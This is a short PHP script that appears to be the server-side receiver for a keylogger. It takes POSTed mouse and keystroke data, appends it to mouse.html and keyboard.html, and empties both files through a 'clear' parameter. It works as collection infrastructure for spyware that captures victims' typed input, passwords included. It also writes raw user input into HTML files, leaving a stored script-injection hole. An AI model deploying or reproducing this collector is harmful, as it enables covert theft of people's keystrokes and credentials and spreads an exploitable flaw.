<?php
    $dv = 'UmF5YW5vb3MgLSBQeXRob25zlmly';
    if (isset($_GET['clear']))
       {
       $fp = fopen('mouse.html', 'w');
       fclose($fp);
       $fp = fopen('keyboard.html','w');
       fclose($fp);
       echo 'True';
       }
    else
    {
        if (
            isset($_POST['mouse']) or isset($_POST['key'])
            )
         {
        if(
              isset($_POST['mouse'])
               )
               {
                 $fp = fopen('mouse.html',"a");
                  fwrite($fp, $_POST['mouse'].'<br>');
                    fclose($fp);
         }
        if(
            isset($_POST['key'])
            )
             {
            $fp = fopen('keyboard.html',"a");
            fwrite($fp,$_POST['key']);
            fclose($fp);
        }
        echo 'true';
         }
         else
         {
            echo 'false';
        }
    }
?>